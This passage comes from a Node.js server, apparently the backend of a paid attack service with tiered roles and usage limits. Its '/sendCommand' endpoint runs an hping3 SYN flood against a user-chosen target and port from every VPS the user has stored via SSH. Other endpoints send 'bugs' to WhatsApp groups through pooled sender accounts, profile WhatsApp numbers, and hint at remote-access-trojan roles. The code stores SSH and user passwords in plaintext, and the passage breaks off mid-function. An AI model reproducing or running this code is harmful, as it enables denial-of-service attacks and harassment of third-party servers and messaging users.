  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || user.role !== "owner") {
    return res.json({ success: false, message: "Only owner can block users." });
  }
  
  const chatUser = chatUsers.find(u => u.id === userId);
  if (!chatUser) {
    return res.json({ success: false, message: "User not found." });
  }
  
  chatUser.isBlocked = true;
  chatUser.blockedReason = reason || "Melanggar aturan chat";
  chatUser.blockedAt = new Date().toISOString();
  
  saveChatUsers();
  
  const systemMsg = {
    id: `msg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    userId: 'system',
    username: 'System',
    message: `⛔ User ${chatUser.chatName} telah diblokir oleh admin. Alasan: ${chatUser.blockedReason}`,
    timestamp: new Date().toISOString(),
    isSystem: true
  };
  
  chatMessages.push(systemMsg);
  if (chatMessages.length > 200) {
    chatMessages = chatMessages.slice(-200);
  }
  saveChatMessages();
  
  res.json({
    success: true,
    user: chatUser
  });
});

app.post("/chat/unblock", (req, res) => {
  const { key, userId } = req.body;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid key." });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || user.role !== "owner") {
    return res.json({ success: false, message: "Only owner can unblock users." });
  }
  
  const chatUser = chatUsers.find(u => u.id === userId);
  if (!chatUser) {
    return res.json({ success: false, message: "User not found." });
  }
  
  chatUser.isBlocked = false;
  chatUser.blockedReason = null;
  
  saveChatUsers();
  
  const systemMsg = {
    id: `msg_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    userId: 'system',
    username: 'System',
    message: `✅ User ${chatUser.chatName} telah dibuka blokirnya.`,
    timestamp: new Date().toISOString(),
    isSystem: true
  };
  
  chatMessages.push(systemMsg);
  if (chatMessages.length > 200) {
    chatMessages = chatMessages.slice(-200);
  }
  saveChatMessages();
  
  res.json({
    success: true,
    user: chatUser
  });
});

app.post("/chat/deleteMessage", (req, res) => {
  const { key, messageId } = req.body;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid key." });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || user.role !== "owner") {
    return res.json({ success: false, message: "Only owner can delete messages." });
  }
  
  const index = chatMessages.findIndex(m => m.id === messageId);
  if (index !== -1) {
    chatMessages.splice(index, 1);
    saveChatMessages();
  }
  
  res.json({ success: true });
});

app.get("/setMaintenance", (req, res) => {
  const { key, mode, reason, duration, channel } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key." });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Only owner can set maintenance mode." });
  }
  
  maintenanceMode = mode === 'true' || mode === '1';
  
  if (reason) maintenanceReason = reason;
  if (duration) maintenanceDuration = parseInt(duration);
  if (channel) maintenanceChannel = channel;
  
  if (maintenanceMode) {
    maintenanceStartTime = Date.now();
  } else {
    maintenanceStartTime = null;
  }
  
  console.log(`[🔧 MAINTENANCE] Mode: ${maintenanceMode}, Reason: ${maintenanceReason}, Duration: ${maintenanceDuration}s`);
  
  return res.json({ 
    valid: true, 
    success: true, 
    maintenance: maintenanceMode,
    reason: maintenanceReason,
    duration: maintenanceDuration,
    channel: maintenanceChannel
  });
});

app.get("/maintenanceStatus", (req, res) => {
  let remainingDuration = 0;
  
  if (maintenanceMode && maintenanceStartTime) {
    const elapsedSeconds = Math.floor((Date.now() - maintenanceStartTime) / 1000);
    remainingDuration = Math.max(0, maintenanceDuration - elapsedSeconds);
    
    if (remainingDuration <= 0) {
      maintenanceMode = false;
      maintenanceStartTime = null;
      console.log("[🔧 MAINTENANCE] Auto disabled - duration expired");
    }
  }
  
  return res.json({
    maintenance: maintenanceMode,
    reason: maintenanceReason,
    duration: remainingDuration,
    channel: maintenanceChannel
  });
});

app.get("/maintenanceInfo", (req, res) => {
  let remainingDuration = 0;
  
  if (maintenanceMode && maintenanceStartTime) {
    const elapsedSeconds = Math.floor((Date.now() - maintenanceStartTime) / 1000);
    remainingDuration = Math.max(0, maintenanceDuration - elapsedSeconds);
  }
  
  return res.json({
    maintenance: maintenanceMode,
    reason: maintenanceReason,
    remaining: remainingDuration,
    channel: maintenanceChannel,
    startTime: maintenanceStartTime
  });
});

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
const spamCooldown = {};
const cooldowns = {};

app.get('/getChannelInfo', (req, res) => {
  try {
    console.log(`[${new Date().toISOString()}] GET /getChannelInfo - IP: ${req.ip}`);
    
    res.status(200).json({
      success: true,
      link: channelConfig.link,
      message: channelConfig.message,
      image: channelConfig.image,
      buttonText: channelConfig.buttonText
    });
    
  } catch (error) {
    console.error('Error in /getChannelInfo:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      link: "https://t.me/aanchannell",
      message: "Jangan Lupa Join Saluran Official!"
    });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId, role };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId, role });
  }

  saveKeyList(list);
}

  const news = [
   {
      image: "https://cdn.yupra.my.id/yp/9qzskcsa.png",
      title: "A Z X V 8",
      desc: "Support By AzxGateway"
    },
    {
    image: "https://cdn.yupra.my.id/yp/k20s06dx.jpg",
    tittle: "O T P Y U K",
    desc: "Support By OtpYuk"
    }   
  ];

app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// ═══ PAIRID: hanya untuk role privileged ═══
if (isRatPrivileged(user.role) && !user.pairId) {
  user.pairId = genPairId();
  saveDatabase(db);
  console.log(`[PAIRID] Auto-generate (validate) untuk ${user.username} (${user.role}): ${user.pairId}`);
}

const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  role: user.role || "member",
  pairId: isRatPrivileged(user.role) ? (user.pairId || '') : null,
  listBug: bugs,
  listCustom: bugscustom,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  // ═══ PAIRID: hanya untuk role privileged ═══
  if (isRatPrivileged(user.role) && !user.pairId) {
    user.pairId = genPairId();
    saveDatabase(db);
    console.log(`[PAIRID] Auto-generate (myInfo) untuk ${user.username} (${user.role}): ${user.pairId}`);
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pairId: isRatPrivileged(user.role) ? (user.pairId || '') : null,
    listBug: bugs,
    listCustom: bugscustom,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

const deliveryHistory = new Map();

app.get("/getDeliveryStatus", (req, res) => {
  const { key, target } = req.query;
  
  if (!key || !target) {
    return res.json({
      success: false,
      message: "Key dan target diperlukan"
    });
  }

  const historyKey = `${key}_${target}`;
  const history = deliveryHistory.get(historyKey) || [];
  
  const recentHistory = history.slice(-50);
  
  res.json({
    success: true,
    history: recentHistory,
    total: history.length
  });
});

app.get("/getUserStats", (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.json({
      success: false,
      message: "Key diperlukan"
    });
  }

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({
      success: false,
      message: "Key tidak valid"
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({
      success: false,
      message: "User tidak ditemukan"
    });
  }

  let totalSent = 0;
  let totalSuccess = 0;
  let totalFailed = 0;
  let executionsByBug = {};
  
  deliveryHistory.forEach((history, historyKey) => {
    if (historyKey.startsWith(key)) {
      history.forEach(item => {
        totalSent++;
        if (item.status === 'success') totalSuccess++;
        if (item.status === 'failed') totalFailed++;
        if (item.status === 'partial') totalFailed++;
        
        if (item.bugType) {
          if (item.bugType.includes('+')) {
            const bugTypes = item.bugType.split('+');
            bugTypes.forEach(type => {
              executionsByBug[type] = (executionsByBug[type] || 0) + 1;
            });
          } else {
            executionsByBug[item.bugType] = (executionsByBug[item.bugType] || 0) + 1;
          }
        }
      });
    }
  });

  res.json({
    success: true,
    stats: {
      username: user.username,
      role: user.role,
      totalSent,
      totalSuccess,
      totalFailed,
      successRate: totalSent > 0 ? ((totalSuccess / totalSent) * 100).toFixed(1) : 0,
      executionsByBug
    },
    lastSend: user.lastSend || 0
  });
});

app.get("/getConsoleLogs", (req, res) => {
  const { key, limit = 100 } = req.query;
  
  if (!key) {
    return res.json({
      success: false,
      message: "Key diperlukan"
    });
  }

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({
      success: false,
      message: "Key tidak valid"
    });
  }

  const logsKey = `logs_${key}`;
  const logs = deliveryHistory.get(logsKey) || [];
  
  const sortedLogs = [...logs].reverse();
  
  res.json({
    success: true,
    logs: sortedLogs.slice(0, parseInt(limit))
  });
});

function logDelivery(key, target, data) {
  if (!key) {
    console.error("logDelivery: key is required");
    return;
  }
  
  const historyKey = `${key}_${target}`;
  if (!deliveryHistory.has(historyKey)) {
    deliveryHistory.set(historyKey, []);
  }
  
  const history = deliveryHistory.get(historyKey);
  const logEntry = {
    ...data,
    target,
    timestamp: Date.now(),
    timestampFormatted: new Date().toLocaleString('id-ID')
  };
  
  history.push(logEntry);
  
  const logsKey = `logs_${key}`;
  if (!deliveryHistory.has(logsKey)) {
    deliveryHistory.set(logsKey, []);
  }
  
  const logs = deliveryHistory.get(logsKey);
  logs.push({
    ...data,
    target,
    timestamp: Date.now(),
    timestampFormatted: new Date().toLocaleString('id-ID')
  });
  
  if (history.length > 200) {
    history.splice(0, history.length - 200);
  }
  
  if (logs.length > 500) {
    logs.splice(0, logs.length - 500);
  }
  
  console.log(`[LOG] Delivery recorded for key ${key} to ${target} - Status: ${data.status}`);
}

let activeBugProcesses = [];
let bugHistory = [];
let bugStats = {
  total_today: 0,
  success_today: 0,
  failed_today: 0,
  pending_today: 0,
  sender_issues: 0
};

function resetDailyStats() {
  const now = new Date();
  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
  
  if (!bugStats.lastReset || today > bugStats.lastReset) {
    bugStats = {
      total_today: 0,
      success_today: 0,
      failed_today: 0,
      pending_today: 0,
      sender_issues: 0,
      lastReset: today
    };
    console.log(`[📊 STATS] Reset statistik harian: ${new Date().toLocaleString('id-ID')}`);
  }
}

function addBugLog(logData) {
  resetDailyStats();
  
  const now = new Date();
  const timeString = now.toLocaleString('id-ID', {
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  }) + ' WIB';
  
  const logEntry = {
    id: Date.now() + Math.random(),
    timestamp: now.toISOString(),
    timeString: timeString,
    ...logData
  };
  
  bugHistory.unshift(logEntry);
  
  bugStats.total_today++;
  if (logData.status === 'success') bugStats.success_today++;
  if (logData.status === 'failed') bugStats.failed_today++;
  if (logData.status === 'pending') bugStats.pending_today++;
  if (logData.error_type) bugStats.sender_issues++;
  
  if (bugHistory.length > 200) {
    bugHistory = bugHistory.slice(0, 200);
  }
  
  return logEntry;
}

function updateBugProcess(processId, updates) {
  const index = activeBugProcesses.findIndex(p => p.id === processId);
  if (index !== -1) {
    activeBugProcesses[index] = { ...activeBugProcesses[index], ...updates, lastUpdate: new Date().toISOString() };
    
    if (updates.status === 'completed' || updates.status === 'failed') {
      setTimeout(() => {
        activeBugProcesses = activeBugProcesses.filter(p => p.id !== processId);
      }, 30000);
    }
    
    return activeBugProcesses[index];
  }
  return null;
}

app.get('/bugMonitor/active', async (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ 
      success: false,
      error: 'Invalid session' 
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.status(401).json({ 
      success: false,
      error: 'User not found' 
    });
  }

  const fiveMinutesAgo = Date.now() - (5 * 60 * 1000);
  activeBugProcesses = activeBugProcesses.filter(p => 
    new Date(p.timestamp).getTime() > fiveMinutesAgo || 
    p.status === 'processing'
  );

  let processes = activeBugProcesses;
  if (user.role !== 'owner' && user.role !== 'admin') {
    processes = activeBugProcesses.filter(p => p.username === user.username);
  }

  res.json({
    success: true,
    processes: processes,
    user_role: user.role,
    total_active: processes.length
  });
});

app.get('/bugMonitor/history', async (req, res) => {
  const { key, limit = 50 } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ 
      success: false,
      error: 'Invalid session' 
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.status(401).json({ 
      success: false,
      error: 'User not found' 
    });
  }

  let history = bugHistory;
  if (user.role !== 'owner' && user.role !== 'admin') {
    history = bugHistory.filter(h => h.username === user.username);
  }

  res.json({
    success: true,
    history: history.slice(0, parseInt(limit)),
    user_role: user.role,
    total_history: history.length
  });
});

app.get('/bugMonitor/stats', async (req, res) => {
  const { key } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ 
      success: false,
      error: 'Invalid session' 
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.status(401).json({ 
      success: false,
      error: 'User not found' 
    });
  }

  resetDailyStats();

  let relevantHistory = bugHistory;
  let relevantProcesses = activeBugProcesses;
  
  if (user.role !== 'owner' && user.role !== 'admin') {
    relevantHistory = bugHistory.filter(h => h.username === user.username);
    relevantProcesses = activeBugProcesses.filter(p => p.username === user.username);
  }

  const today = new Date().setHours(0, 0, 0, 0);
  const todayHistory = relevantHistory.filter(h => new Date(h.timestamp).setHours(0, 0, 0, 0) === today);
  
  const senderIssues = relevantHistory.filter(h => 
    h.error_type === 'sender_offline' || 
    h.error_type === 'sender_overload' ||
    h.message?.includes('sender') ||
    h.message?.includes('Connection')
  ).length;
  
  const stats = {
    total_today: todayHistory.length,
    success_today: todayHistory.filter(h => h.status === 'success').length,
    failed_today: todayHistory.filter(h => h.status === 'failed').length,
    pending_today: todayHistory.filter(h => h.status === 'pending').length,
    active_processes: relevantProcesses.length,
    sender_issues: senderIssues,
    user_role: user.role,
    total_all_time: relevantHistory.length
  };

  res.json({
    success: true,
    stats: stats,
    user_role: user.role
  });
});

app.get('/bugMonitor/details', async (req, res) => {
  const { key, id } = req.query;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ 
      success: false,
      error: 'Invalid session' 
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.status(401).json({ 
      success: false,
      error: 'User not found' 
    });
  }

  let detail = activeBugProcesses.find(p => p.id == id);
  
  if (!detail) {
    detail = bugHistory.find(h => h.id == id);
  }

  if (!detail) {
    return res.json({
      success: false,
      message: 'Bug not found'
    });
  }

  if (user.role !== 'owner' && user.role !== 'admin' && detail.username !== user.username) {
    return res.status(403).json({
      success: false,
      message: 'Access denied'
    });
  }

  res.json({
    success: true,
    detail: detail
  });
});

app.get("/checkGlobalAccess", async (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.json({ success: false, canUseGlobal: false, reason: "Key tidak valid" });
  }
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, canUseGlobal: false, reason: "Session expired" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, canUseGlobal: false, reason: "User tidak ditemukan" });
  }
  
  const role = user.role || "member";
  let canUseGlobal = false;
  let reason = "";
  
  switch (role) {
    case "founder":
      canUseGlobal = true;
      reason = "Founder dapat menggunakan global sender (owner, reseller, vip, member)";
      break;
    case "owner":
      canUseGlobal = true;
      reason = "Owner dapat menggunakan global sender (reseller, vip, member)";
      break;
    case "reseller":
      canUseGlobal = true;
      reason = "Reseller dapat menggunakan global sender (vip, member)";
      break;
    case "vip":
      canUseGlobal = true;
      reason = "VIP dapat menggunakan global sender (member)";
      break;
    case "member":
      canUseGlobal = false;
      reason = "Member tidak dapat menggunakan global sender. Silahkan gunakan private sender atau add sender terlebih dahulu.";
      break;
    default:
      canUseGlobal = false;
      reason = "Role tidak dikenal";
  }
  
  res.json({
    success: true,
    canUseGlobal: canUseGlobal,
    reason: reason,
    role: role
  });
});

app.get("/checkPrivateSender", async (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.json({ success: false, hasPrivateSender: false });
  }
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, hasPrivateSender: false });
  }
  
  const username = keyInfo.username;
  
  const hasPrivateSender = await checkActiveSessionInFolder(username) !== null;
  
  res.json({
    success: true,
    hasPrivateSender: hasPrivateSender,
    username: username
  });
});

app.get("/getUserLimit", async (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.json({ success: false, message: "Key diperlukan" });
  }
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Key tidak valid" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User tidak ditemukan" });
  }
  
  const limitInfo = getUserLimitInfo(user.username, user.role);
  
  res.json({
    success: true,
    limit_info: limitInfo
  });
});

app.get("/getAllLimits", async (req, res) => {
  const { key } = req.query;
  
  if (!key) {
    return res.json({ success: false, message: "Key diperlukan" });
  }
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Key tidak valid" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || (user.role !== 'founder' && user.role !== 'owner')) {
    return res.json({ success: false, message: "Akses ditolak" });
  }
  
  const limits = loadLimits();
  const allLimits = [];
  
  for (const [username, data] of Object.entries(limits.users)) {
    allLimits.push({
      username: username,
      role: data.role,
      limit: data.limit === -1 ? 'Unlimited' : data.limit,
      used: data.used || 0,
      remaining: data.remaining === -1 ? 'Unlimited' : data.remaining,
      resetAt: new Date(data.resetAt).toLocaleString('id-ID')
    });
  }
  
  res.json({
    success: true,
    limits: allLimits
  });
});

app.get("/resetUserLimit", async (req, res) => {
  const { key, username } = req.query;
  
  if (!key || !username) {
    return res.json({ success: false, message: "Key dan username diperlukan" });
  }
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Key tidak valid" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user || (user.role !== 'founder' && user.role !== 'owner')) {
    return res.json({ success: false, message: "Akses ditolak" });
  }
  
  const result = resetUserLimitAdmin(username);
  res.json(result);
});

app.get("/sendGroupBug", async (req, res) => {
  const { key, bug, senderMode } = req.query;
  let { target } = req.query;
  
  const selectedSenderMode = senderMode || "global";
  const originalTarget = target;
  
  console.log(`[📤 GROUP BUG] Send group bug request received`);
  console.log(`- Key: ${key}`);
  console.log(`- Target: ${originalTarget}`);
  console.log(`- Bug: ${bug}`);
  console.log(`- Sender Mode: ${selectedSenderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ GROUP BUG] Key tidak valid.");
    
    logDelivery(key, originalTarget, {
      type: 'group_bug',
      bugType: bug,
      status: 'failed',
      message: 'Key tidak valid atau sudah kadaluarsa',
      sender: 'unknown'
    });
    
    addBugLog({
      username: 'unknown',
      user_role: 'unknown',
      target: originalTarget,
      bug_type: bug,
      status: 'failed',
      message: 'Key tidak valid',
      sender: 'unknown',
      error_type: 'invalid_key'
    });
    
    return res.json({ 
      valid: false,
      sended: false,
      message: "Key tidak valid atau sudah kadaluarsa"
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ GROUP BUG] User tidak ditemukan.");
    
    logDelivery(key, originalTarget, {
      type: 'group_bug',
      bugType: bug,
      status: 'failed',
      message: 'User tidak ditemukan dalam database',
      sender: 'unknown'
    });
    
    addBugLog({
      username: keyInfo.username,
      user_role: 'unknown',
      target: originalTarget,
      bug_type: bug,
      status: 'failed',
      message: 'User tidak ditemukan di database',
      sender: 'unknown',
      error_type: 'user_not_found'
    });
    
    return res.json({ 
      valid: false,
      sended: false,
      message: "User tidak ditemukan dalam database"
    });
  }

  const roleCooldowns = {
    founder: 10,
    owner: 20,
    reseller: 30,
    vip: 60,
    member: 120,
  };
  
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown - ${diffSeconds} detik dari ${cooldownSeconds} detik`);
    
    const waitTime = cooldownSeconds - diffSeconds;
    
    logDelivery(key, originalTarget, {
      type: 'group_bug',
      bugType: bug,
      status: 'failed',
      message: `Cooldown, tunggu ${waitTime} detik lagi`,
      sender: 'unknown'
    });
    
    addBugLog({
      username: user.username,
      user_role: user.role,
      target: originalTarget,
      bug_type: bug,
      status: 'failed',
      message: `Cooldown ${waitTime}s`,
      sender: 'unknown',
      error_type: 'cooldown',
      wait_time: waitTime
    });
    
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: waitTime,
      role: role,
      message: `Tunggu ${waitTime} detik sebelum mengirim lagi`
    });
  }

  if (selectedSenderMode === "global") {
    const globalAccess = canUseGlobalSender(user.username, role);
    
    if (!globalAccess.allowed) {
      console.log(`[❌ GLOBAL LIMIT] ${user.username} tidak bisa pakai global: ${globalAccess.reason}`);
      
      addBugLog({
        username: user.username,
        user_role: user.role,
        target: originalTarget,
        bug_type: bug,
        status: 'failed',
        message: globalAccess.reason,
        sender: 'none',
        error_type: 'limit_exceeded',
        sender_mode: 'global'
      });
      
      return res.json({
        valid: true,
        sended: false,
        limit_exceeded: true,
        sender_mode: 'global',
        role: role,
        message: globalAccess.reason,
        limit_info: {
          remaining: globalAccess.remaining,
          resetAt: globalAccess.resetAt
        }
      });
    }
  }

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupInvite = groupRegex.test(target);
  const isGroupJid = target.endsWith("@g.us");
  
  if (!isGroupInvite && !isGroupJid) {
    console.log("[❌ GROUP BUG] Target bukan group.");
    return res.json({
      valid: false,
      sended: false,
      message: "Target harus berupa link group atau JID group"
    });
  }

  let sock = null;
  let senderInfo = "unknown";
  let actualSender = null;
  let allSenders = [];

  console.log(`[🔍 CEK SENDER] Mode: ${selectedSenderMode} untuk user ${user.username} (${role})`);

  if (selectedSenderMode === "private") {
    console.log(`[🔍 PRIVATE MODE] Mencari session pribadi untuk ${user.username}`);
    sock = await checkActiveSessionInFolder(user.username);
    senderInfo = user.username;
    
    if (!sock) {
      console.warn(`[❌ PRIVATE MODE] Tidak ada koneksi aktif untuk ${user.username}.`);
      
      logDelivery(key, originalTarget, {
        type: 'group_bug',
        bugType: bug,
        status: 'failed',
        message: 'Private sender tidak aktif',
        sender: senderInfo
      });
      
      addBugLog({
        username: user.username,
        user_role: user.role,
        target: originalTarget,
        bug_type: bug,
        status: 'failed',
        message: 'Private sender tidak aktif',
        sender: senderInfo,
        error_type: 'private_sender_offline',
        sender_mode: 'private'
      });
      
      return res.json({
        valid: true,
        sended: false,
        no_sender: true,
        sender_mode: 'private',
        role: role,
        message: `Private sender Anda (${user.username}) tidak aktif.`
      });
    }
    
    allSenders = [{
      sock: sock,
      username: user.username,
      role: user.role
    }];
    actualSender = sock;
    
  } else {
    console.log(`[🌐 GLOBAL MODE] Mencari semua sender yang tersedia...`);
    
    let allowedRoles = [];
    switch (role) {
      case "founder":
        allowedRoles = ["founder", "owner", "reseller", "vip", "member"];
        break;
      case "owner":
